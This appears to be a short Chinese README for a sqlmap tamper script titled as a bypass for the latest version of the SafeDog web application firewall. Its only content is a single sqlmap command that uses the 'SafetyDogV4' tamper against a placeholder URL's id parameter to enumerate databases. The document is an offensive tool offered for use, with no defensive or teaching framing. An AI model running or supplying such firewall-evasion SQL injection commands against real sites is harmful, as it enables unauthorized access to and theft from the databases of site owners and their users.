# 最新版本安全狗sql注入绕过脚本
获取数据库
python sqlmap.py -u "http://xxx?id=1" -p id --tamper=SafetyDogV4 -v3 --dbs --fresh-queries
